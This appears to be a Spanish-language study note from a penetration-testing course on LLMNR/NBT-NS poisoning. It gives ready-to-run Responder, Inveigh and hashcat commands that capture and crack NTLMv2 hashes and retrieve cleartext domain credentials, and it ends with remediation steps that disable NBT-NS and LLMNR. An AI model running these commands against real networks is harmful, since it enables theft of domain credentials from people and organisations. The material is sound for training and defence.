# 2. Sniffing out a Foothold

## LLMNR/NBT-NS Poisoning

LLMNR y NBT-NS son protocolos de resolución de nombres usados cuando DNS falla. Al envenenarlos, interceptamos hashes NTLMv2 que podemos crackear offline o usar en relay attacks.

---

## Desde Linux — Responder

- [Responder](https://github.com/lgandx/Responder)

### Levantar Responder en la interfaz de red

```c
sudo responder -I ens224
```

### Modo análisis — escuchar sin envenenar (pasivo/seguro)

```c
sudo responder -I ens224 -A
```

El flag `-A` activa el modo análisis. Responder escucha y registra las solicitudes pero no las responde ni envenena. Útil para reconocimiento pasivo o cuando no quieres generar ruido.

Los hashes NTLMv2 capturados aparecen en pantalla y se guardan en `/usr/share/responder/logs/`.

### Crackear el hash capturado

```c
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

El modo `5600` es para NTLMv2. Si crackea, tienes credenciales de dominio válidas.

## Desde Windows — Inveigh

- [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) — Versión PowerShell
- [InveighZero (C#)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) — Versión C# con consola interactiva

### Ver parámetros disponibles

```c
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

### Lanzar Inveigh con captura LLMNR y NBNS

```c
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Versión C# (InveighZero)

```c
.\Inveigh.exe
```

### Comandos interactivos dentro de Inveigh C#

```c
GET NTLMV2          # ver hashes NTLMv2 capturados
GET NTLMV2UNIQUE    # un hash por usuario
GET NTLMV2USERNAMES # usuarios y IPs
GET CLEARTEXT       # credenciales en texto claro
STOP                # detener Inveigh
```

## Remediación — Deshabilitar NBT-NS via PowerShell

```c
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
```

El valor `2` deshabilita NBT-NS en todas las interfaces. También se puede deshabilitar LLMNR via GPO en: Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution.
